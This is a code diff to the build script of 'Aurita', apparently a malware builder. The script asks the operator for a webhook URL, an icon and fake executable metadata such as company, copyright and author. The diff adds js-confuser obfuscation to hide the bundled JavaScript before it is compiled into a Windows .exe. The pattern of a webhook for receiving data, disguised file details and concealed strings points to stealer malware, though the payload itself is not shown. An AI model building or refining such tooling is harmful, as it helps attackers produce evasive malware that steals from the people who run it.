@@ -1,4 +1,5 @@
 const {
+    applyGradient,
     decodeBase64,
     isWebhook,
     isLinkIcon
@@ -12,6 +13,7 @@ const {
 
 const { spawnSync } = require("child_process");
 const imageToIco    = require("image-to-ico");
+const jsConfuser    = require("js-confuser");
 const readline      = require("readline");
 const gradient      = require("gradient-string");
 const chalk         = require("chalk-animation");
@@ -19,8 +21,8 @@ const axios         = require("axios");
 const path          = require("path");
 const fs            = require("fs");
 
-const { atlas, instagram, summer } = gradient;
-const { radar } = chalk;
+const { summer } = gradient;
+const { radar }  = chalk;
 
 const rl = readline.createInterface({
     input: process.stdin,
@@ -101,10 +103,10 @@ const createBuild = async (dest, JSON) => {
         });
 
         fs.rename(`./build/dist/${exeName}/${exeName}.exe`, `./${exeName}.exe`, (err) => {
-            if (err) {
-                console.error('The file is inside "./build/dist"');
-            } else {
+            if (!err) {
                 console.log(`Executable file as "${exeName}"`);
+            } else {
+                console.error('The file is inside "./build/dist"');
             }
         });
 
@@ -113,7 +115,7 @@ const createBuild = async (dest, JSON) => {
     }
 }
 
-const createObfuscation = async (JSON) => {
+const createObf = async (JSON) => {
     let webhook     = JSON.WEBHOOK,
         exeName     = JSON.EXECUTABLE_NAME ?? "Aurita",
         appCompany  = JSON.APP_COMPANY ?? "Snake Company",
@@ -124,20 +126,21 @@ const createObfuscation = async (JSON) => {
         author      = JSON.AUTHOR ?? "k4itrun",
         desc        = JSON.DESC ?? "Do Do-Hee <3";
 
-    let destDir = `./build/script/${exeName}`;
+    const destDir = `./build/script/${exeName}`;
 
     const cloneDir = (src, dest) => {
         try {
             if (!fs.existsSync(dest)) {
                 fs.mkdirSync(dest);
             }
-            fs.readdirSync(src).forEach((file) => {
-                let sourceFilePath = path.join(src, file);
+            (fs.readdirSync(src)).forEach((file) => {
+                let srcFilePath = path.join(src, file);
                 let destFilePath = path.join(dest, file);
-                if (fs.statSync(sourceFilePath).isFile()) {
-                    fs.copyFileSync(sourceFilePath, destFilePath);
-                } else if (fs.statSync(sourceFilePath).isDirectory()) {
-                    cloneDir(sourceFilePath, destFilePath);
+
+                if (fs.statSync(srcFilePath).isFile()) {
+                    fs.copyFileSync(srcFilePath, destFilePath);
+                } else if (fs.statSync(srcFilePath).isDirectory()) {
+                    cloneDir(srcFilePath, destFilePath);
                 }
             });
         } catch (e) {
@@ -146,23 +149,55 @@ const createObfuscation = async (JSON) => {
     };
 
     const obfFiles = async (dir) => {
-        try {
-            const files = fs.readdirSync(dir);
+        const files = fs.readdirSync(dir);
 
+        try {
             for (const file of files) {
                 const filePath = path.join(dir, file);
 
                 if (fs.statSync(filePath).isDirectory()) {
                     await obfFiles(filePath);
-                } else if (file.endsWith(".js") && !filePath.includes("node_modules") && !file.includes("build.js")) {
-                    await fs.writeFileSync(filePath, fs.readFileSync(filePath, "utf-8")); //later added better obfuscation
+                } else if (
+                    file.endsWith(".js")               && 
+                    !filePath.includes("node_modules") && 
+                    !file.includes("build.js")
+                ) {
+                    const srcCode      = fs.readFileSync(filePath, "utf-8");
+                    const applyObfCode = await jsConfuser.obfuscate(srcCode, {
+                    target: "node",
+                    controlFlowFlattening: 0,
+                    minify: false,
+                    globalConcealing: true,
+                    stringCompression: 1,
+                    stringConcealing: 0.9,
+                    stringEncoding: 0.3,
+                    stringSplitting: 1,
+                    deadCode: 0,
+                    calculator: 0.5,
+                    compact: true,
+                    movedDeclarations: false,
+                    objectExtraction: false,
+                    stack: true,
+                    duplicateLiteralsRemoval: 0,
+                    flatten: false,
+                    dispatcher: true,
+                    opaquePredicates: 0,
+                    shuffle: { hash: 0.6, true: 0.6 },
+                    renameVariables: false,
+                    renameGlobals: false,
+                    });
+
+                    await fs.writeFileSync(filePath, applyObfCode);
                 }
             }
-        } catch (e) {
-            console.error(e)
+        } catch (err) {
+            console.error(`Error processing directory "${dir}":`, err.message);
         }
     };
 
+    const obf = async (dir) => {
+        await obfFiles(dir);
+    };
 
     const replaceKeys = (file) => {
         try {
@@ -222,17 +257,17 @@ const createObfuscation = async (JSON) => {
 
     cloneDir(SRC_DIR, destDir);
     await traverse(destDir);
-    await obfFiles(destDir);
+    await obf(destDir);
 
     return destDir;
 }
 
-async function ask(qst) {
+async function createAsk(qst) {
     try {
         currentQst++;
 
         return (await new Promise((resolve, reject) => {
-            rl.question(atlas(`Question ${currentQst}: ${qst}`), (ans) => {
+            rl.question(applyGradient(['#fcca7e', '#ed7efc', '#7eb0fc', '#7ee0fc'], `Question ${currentQst}: ${qst}`), (ans) => {
                 resolve(ans);
             });
         })).trim();
@@ -252,7 +287,6 @@ async function createFucking() {
         radar(BANNER_AURITA).start();
 
         setTimeout(async () => {
-
             radar(summer(BANNER_AURITA)).stop();
 
             spawnSync(path.join(__dirname, SRC_DIR.replace("./", ""), "install.bat"), [], {
@@ -261,33 +295,33 @@ async function createFucking() {
             });
 
             console.clear();
-            console.log(instagram(BANNER_AURITA));
+            console.log(applyGradient(['#FFFFFF', '#E0BBE4', '#957DAD', '#D291BC', '#F17EF7', '#8A2BE2', '#af45fa'], BANNER_AURITA));
 
-            let webhook = await ask("Add your \"WEBHOOK\": ");
+            let webhook = await createAsk("Add your \"WEBHOOK\": ");
             while (!isWebhook(webhook)) {
-                webhook = await ask("Add a \"WEBHOOK\" validity: ");
+                webhook = await createAsk("Add a \"WEBHOOK\" validity: ");
             }
 
-            let exIcon = await ask("Please specify the \"ICON\" using a url with the extensions (Png, Jpg, WebP): ");
+            let exIcon = await createAsk("Please specify the \"ICON\" using a url with the extensions (Png, Jpg, WebP): ");
             while (!isLinkIcon(exIcon)) {
-                exIcon = await ask("Specify a valid link for your \"ICON\" the extensions (Png, Jpg, WebP): ");
+                exIcon = await createAsk("Specify a valid link for your \"ICON\" the extensions (Png, Jpg, WebP): ");
             }
 
             JSON.WEBHOOK         = webhook;
             JSON.EXECUTABLE_ICON = exIcon;
-            JSON.EXECUTABLE_NAME = await ask("Please specify your 'EXE' file \"Name\": ");
-            JSON.APP_COMPANY     = await ask("Please specify your 'EXE' file \"App Company\": ");
-            JSON.COPYRIGHT       = await ask("Please specify your 'EXE' file \"Legal Copyright\": ");
-            JSON.LICENSE         = await ask("Please specify your 'EXE' file \"License\": ");
-            JSON.AUTHOR          = await ask("Please specify your 'EXE' file \"Author\": ");
-            JSON.DESC            = await ask("Please specify your 'EXE' file \"Description\": ");
+            JSON.EXECUTABLE_NAME = await createAsk("Please specify your 'EXE' file \"Name\": ");
+            JSON.APP_COMPANY     = await createAsk("Please specify your 'EXE' file \"App Company\": ");
+            JSON.COPYRIGHT       = await createAsk("Please specify your 'EXE' file \"Legal Copyright\": ");
+            JSON.LICENSE         = await createAsk("Please specify your 'EXE' file \"License\": ");
+            JSON.AUTHOR          = await createAsk("Please specify your 'EXE' file \"Author\": ");
+            JSON.DESC            = await createAsk("Please specify your 'EXE' file \"Description\": ");
 
             rl.close();
             console.clear();
 
             try {
                 console.log("Obfuscation...")
-                const obfPath = await createObfuscation(JSON);
+                const obfPath = await createObf(JSON);
 
                 console.log("Building...")
                 await createBuild(obfPath, JSON);
